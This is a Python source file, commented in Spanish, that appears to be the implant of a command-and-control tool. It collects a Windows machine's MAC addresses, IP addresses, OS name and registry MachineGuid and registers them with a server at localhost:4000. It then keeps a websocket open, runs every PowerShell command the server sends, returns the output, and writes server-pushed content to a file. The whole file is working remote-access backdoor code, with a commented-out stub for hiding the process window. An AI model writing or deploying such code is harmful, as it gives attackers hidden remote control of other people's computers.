import asyncio
from websockets import connect
from websockets.exceptions import ConnectionClosedError
import json
import subprocess
import signal
import sys
import requests

GROUP="grupo1"

def def_handler(sig, frame):
    
    print("\n\n[!] Saliendo..\n")	
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#def hid():
#    if subprocess.mswindows:
#        DETACHED_PROCESS = 0X00000008
#        CREATE_NO_WINDOW = 0X00000000
#        subprocess.Popen


def cmo(cmd):
    # Escapar comillas dobles para PowerShell
    escaped_cmd = cmd.replace('"', '`"')  # backtick para escapar en PowerShell
    result = subprocess.run(
        ['powershell.exe', '-Command', escaped_cmd],
        capture_output=True, text=True
    )
    return result.stdout, result.stderr

def get_macs():
    macs_output, err = cmo("Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress")
    maclist=[]
    if macs_output:
        for num in macs_output.splitlines():
            maclist.append(num.replace("\n","").replace("\r",""))
        return maclist
    else:
        return ['undefined']

def get_local_ips():
    ips_output, err = cmo("Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress")
    iplist=[]
    if ips_output:
        for ip in ips_output.splitlines():
            iplist.append(ip.replace("\n","").replace("\r",""))
        return iplist
    else:
        return ['undefined']

def get_public_ip():
    ip_output, err = cmo('Invoke-RestMethod -Uri "https://api.ipify.org"')
    if ip_output:
        return ip_output
    else:
        return "undefined"

def get_operating_system():
    sysop, err = cmo('(Get-CimInstance Win32_OperatingSystem).Caption')
    if sysop:
        return sysop
    else:
        return "undefined"
    

def impl_id():
    return  str( cmo("(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid).MachineGuid")[0]).replace('\\n', '').strip()

def register():
    maclist = get_macs()
    local_ip = get_local_ips()
    public_ip = get_public_ip().replace("\n","").replace("\r","")
    operating_system = get_operating_system().replace("\n","").replace("\r","")

    model={
        'impl_mac': maclist,
        'group': GROUP,
        'public_ip': public_ip,
        'local_ip': local_ip,
        'operating_system': operating_system,
        'impl_id':impl_id()
    }

    req=requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)

async def receive():

    register()

    try:

        uri = f"ws://localhost:4000/api/rcv?id={impl_id()}"
        async with connect(uri) as ws:

            try:
                while True:
                    cmd = await ws.recv()
                    data = json.loads(cmd.replace("'", '"'))

                    if 'cmd' in data:
                        try:
                            out, err = cmo(data["cmd"])

                            #print(f" {data["cmd"]}")
                            if out:
                                #print(f"> {out}")
                                await ws.send(out)
                            else:
                                #print(f"> {err}")
                                await ws.send(err)
                        
                        except json.JSONDecodeError as e:
                            await asyncio.sleep(5)
                            #print(f"JSON inválido: {e}")
                        except Exception as e:
                            await asyncio.sleep(5)
                            #print(f"Error procesando el comando: {e}")
                    elif 'file' in data:
                        print(data['file'])
                        OUTPUT_FILE = 'archivo_recibido.txt'
                        with open(OUTPUT_FILE, 'a') as f:
                            f.write(data['file'])
                            print("Transferencia finalizada.")

            except ConnectionClosedError as e:
                #print(f"[!] Conexión cerrada: {e}. Reintentando en 5 segundos...")
                await asyncio.sleep(5)
            except Exception as e:
                #print(f"[!] Error inesperado: {e}. Reintentando en 5 segundos...")
                await asyncio.sleep(5)


    except Exception as e:
        await asyncio.sleep(5)
        #print(f": {e}")

asyncio.run( receive() )
